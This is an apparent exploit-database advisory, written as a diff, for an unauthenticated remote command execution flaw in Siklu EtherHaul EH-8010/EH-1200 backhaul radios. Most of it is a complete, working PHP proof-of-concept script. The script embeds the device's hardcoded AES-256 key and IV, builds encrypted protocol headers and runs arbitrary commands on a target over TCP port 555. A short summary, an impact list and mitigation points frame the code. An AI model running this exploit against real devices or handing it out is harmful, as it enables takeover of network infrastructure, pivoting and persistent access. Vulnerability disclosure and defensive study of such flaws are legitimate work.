@@ -1,0 +1,200 @@
+=============================================================================================================================================
+| # Title     : Siklu EtherHaul EH-8010 / EH-1200 Unauthenticated RCE                                                                       |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.ceragon.com/products/siklu-by-ceragon                                                                           |
+=============================================================================================================================================
+
+[+] Summary    : Siklu EtherHaul wireless backhaul devices implement a proprietary encrypted protocol (rfpiped) over TCP port 555. The protocol uses
+                 a hardcoded AES-256 key and static IV, and does not enforce any authentication.
+                 An attacker can send a crafted encrypted message (msg type 0x01)containing an arbitrary command string, which is executed directly
+                 by the operating system.
+
+This leads to unauthenticated remote command execution.
+
+[+] Impact:
+
+- Full device compromise
+- Network pivoting
+- Configuration disclosure
+- Persistent access
+
+[+] Proof of Concept:
+
+The attached PHP PoC establishes an AES-CBC encrypted session and
+executes arbitrary system commands without authentication.
+
+[+] Usage:
+
+php poc.php <target> "<command>"
+
+Mitigation:
+- Disable rfpiped service
+- Restrict TCP/555 access
+- Update firmware
+- Remove hardcoded cryptographic material
+
+[+] POC: php poc.php 192.168.1.10 "mo-info system"
+
+
+<?php
+
+define('PORT', 555);
+define('HDR_LEN', 0x90);
+
+$IV0 = pack(
+    'V4',
+    0xEA703B82,
+    0x75A9A17B,
+    0x1DFC7BB9,
+    0x55A24D72
+);
+
+$KEY = hex2bin(
+    '89e7ffbeeb2d73f5a910fc425b1f3617' .
+    '9fb95e7535a342a05d0248b119d24b82'
+);
+
+
+function recv_exact($sock, $len)
+{
+    $data = '';
+    while (strlen($data) < $len) {
+        $chunk = socket_read($sock, $len - strlen($data));
+        if ($chunk === false || $chunk === '') {
+            throw new Exception("Socket closed");
+        }
+        $data .= $chunk;
+    }
+    return $data;
+}
+
+function pad16_zero($data)
+{
+    $r = strlen($data) % 16;
+    return $r === 0 ? $data : $data . str_repeat("\x00", 16 - $r);
+}
+
+function hdr_checksum($hdr)
+{
+    $sum = 0;
+    for ($i = 0; $i < 0x0C; $i++) {
+        $sum += ord($hdr[$i]);
+    }
+    for ($i = 0x10; $i < HDR_LEN; $i++) {
+        $sum += ord($hdr[$i]);
+    }
+    return $sum & 0xFFFFFFFF;
+}
+
+function build_header($flag, $msg, $payload_len)
+{
+    $hdr = str_repeat("\x00", HDR_LEN);
+    $hdr[0] = chr($flag & 0xFF);
+    $hdr[1] = chr($msg & 0xFF);
+
+    $hdr = substr_replace($hdr, pack('V', $payload_len), 0x08, 4);
+    $chk = hdr_checksum($hdr);
+    $hdr = substr_replace($hdr, pack('V', $chk), 0x0C, 4);
+
+    return $hdr;
+}
+
+class RFPipeSession
+{
+    public $key;
+    public $send_iv;
+    public $recv_iv;
+
+    public function __construct($key, $iv)
+    {
+        $this->key = $key;
+        $this->send_iv = $iv;
+        $this->recv_iv = $iv;
+    }
+
+    public function enc_send($sock, $data)
+    {
+        $ct = openssl_encrypt(
+            $data,
+            'AES-256-CBC',
+            $this->key,
+            OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING,
+            $this->send_iv
+        );
+        $this->send_iv = substr($ct, -16);
+        socket_write($sock, $ct);
+    }
+
+    public function dec_recv($sock, $plain_len)
+    {
+        if ($plain_len <= 0) return '';
+
+        $padded = ($plain_len + 15) & ~15;
+        $ct = recv_exact($sock, $padded);
+
+        $pt = openssl_decrypt(
+            $ct,
+            'AES-256-CBC',
+            $this->key,
+            OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING,
+            $this->recv_iv
+        );
+        $this->recv_iv = substr($ct, -16);
+
+        return substr($pt, 0, $plain_len);
+    }
+
+    public function send_header($sock, $hdr)
+    {
+        $this->enc_send($sock, $hdr);
+    }
+
+    public function recv_header($sock)
+    {
+        $ct = recv_exact($sock, HDR_LEN);
+        $pt = openssl_decrypt(
+            $ct,
+            'AES-256-CBC',
+            $this->key,
+            OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING,
+            $this->recv_iv
+        );
+        $this->recv_iv = substr($ct, -16);
+        return $pt;
+    }
+}
+
+
+if ($argc < 3) {
+    echo "Usage: php siklu_eh_rce_poc.php <target> <command>\n";
+    exit;
+}
+
+$target  = $argv[1];
+$command = $argv[2];
+
+$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+socket_connect($sock, $target, PORT);
+
+$sess = new RFPipeSession($KEY, $IV0);
+
+$payload = $command . "\x00";
+$hdr = build_header(0x00, 0x01, strlen($payload));
+
+$sess->send_header($sock, $hdr);
+$sess->enc_send($sock, pad16_zero($payload));
+
+$response_hdr = $sess->recv_header($sock);
+$len = unpack('V', substr($response_hdr, 0x08, 4))[1];
+
+if ($len > 0) {
+    $out = $sess->dec_recv($sock, $len);
+    echo $out . PHP_EOL;
+}
+
+socket_close($sock);
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
